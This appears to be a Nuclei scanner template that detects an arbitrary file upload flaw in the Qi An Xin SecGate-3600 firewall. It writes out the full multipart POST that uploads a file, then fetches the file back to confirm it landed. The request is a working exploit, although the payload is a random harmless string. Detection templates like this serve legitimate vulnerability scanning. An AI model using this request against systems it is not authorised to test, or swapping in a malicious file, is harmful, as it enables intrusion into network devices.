id: secgate-3600-file-upload2
info:
  name: 奇安信网神SecGate-3600任意文件上传2
  author: MrK
  severity: critical

variables:
  filename: "{{to_lower(rand_base(10))}}"
  boundary: "{{to_lower(rand_base(20))}}"

http:
  - raw:
      - |+
        POST /?g=sec_web_auth_custom_setting_confsave HTTP/1.1
        User-Agent: Mozilla/5.0 (compatible; Baiduspider/2.0; http://www.baidu.com/search/spider.html)
        Accept: */*
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close
        Content-Type: multipart/form-data; boundary={{boundary}}
        Cache-Control: no-cache
        Pragma: no-cache
        Host: {{Hostname}}
        Content-Length: 650

        --{{boundary}}
        Content-Disposition: form-data; name="certfile"; filename="{{filename}}.txt"
        Content-Type: text/plain

        {{randstr}}

        --{{boundary}}
        Content-Disposition: form-data; name="submit_post"

        sec_web_auth_custom_setting_confsave
        --{{boundary}}
        Content-Disposition: form-data; name="error"

        0
        --{{boundary}}
        Content-Disposition: form-data; name="custom"

        admin
        --{{boundary}}
        Content-Disposition: form-data; name="certfile_r"

        file
        --{{boundary}}

      - |+
        GET /attachements/{{filename}}.txt HTTP/1.1
        Host: {{Hostname}}
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.8
        Accept: */*
        User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0
        Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3
        Connection: close
        Cache-Control: max-age=0

    matchers:
      - type: dsl
        dsl:
          - "contains(body_2, '{{randstr}}') && status_code_2==200"



